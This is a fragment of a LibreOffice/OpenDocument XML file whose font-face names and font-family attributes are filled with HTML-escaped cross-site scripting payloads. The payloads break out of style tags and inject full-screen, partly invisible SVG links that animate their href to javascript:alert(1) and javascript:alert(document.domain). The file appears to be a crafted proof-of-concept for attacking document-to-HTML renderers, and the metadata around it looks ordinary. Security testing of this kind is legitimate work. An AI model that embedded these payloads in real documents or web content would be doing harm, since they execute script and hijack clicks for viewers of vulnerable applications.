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lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg style=&quot;position:fixed&amp;#x3b1" svg:font-family="'&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg style=&quot;position:fixed&amp;#x3b', top:0, left:0, height:1000, width:3000, '&quot;&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;400&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(1)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;'"/>
    <style:font-face style:name="&lt;/style&gt;&lt;svg style=&quot;position:fixed&amp;#x3b" svg:font-family="'&lt;/style&gt;&lt;svg style=&quot;position:fixed&amp;#x3b', top:0, left:0, height:1000, width:3000, '&quot;&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;400&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(1)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg style=&quot;position:fixed&amp;#x3b" svg:font-family="'&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg style=&quot;position:fixed&amp;#x3b', top:0, left:0, height:1000, width:3000, '&quot;&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;400&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(1)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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fo:color="#800000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ELLO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&lt;/style&gt;111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1" svg:font-family="'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" svg:font-family="'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" style:font-family-complex="'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1" style:font-family-complex="'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1" style:font-family-complex="'&lt;/styl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1" style:font-family-complex="'&lt;/style&gt;&lt;div contenteditable=false&gt;&lt;svg&gt;&lt;style&gt;svg {position:fixed}&lt;/style&gt;&lt;style&gt;svg {top:0}&lt;/style&gt;&lt;style&gt;svg {left:0}&lt;/style&gt; &lt;style&gt;svg {height:10000px}&lt;/style&gt; &lt;style&gt;svg {width:10000px}&lt;/style&gt; &lt;style&gt;svg {opacity:0}&lt;/style&gt; &lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;?&quot;&gt; &lt;circle r=&quot;4000&quot;&gt;&lt;/circle&gt; &lt;animate attributeName=&quot;xlink:href&quot; begin=&quot;0&quot; from=&quot;javascript:alert(document.domain)&quot; to=&quot;&amp;&quot; /&gt; &lt;/a&gt;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</meta:initial-creator>
    <meta:creation-date>2014-12-11T10:54:02.746263301</meta:creation-date>
    <dc:date>2015-01-22T14:14:28.472134721</dc:date>
    <dc:creator>mario </dc:creator>
    <meta:editing-duration>PT7S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:generator>LibreOffice/4.1.6.2$Linux_X86_64 LibreOffice_project/40ff705089295be5be0aae9b15123f687c05b0a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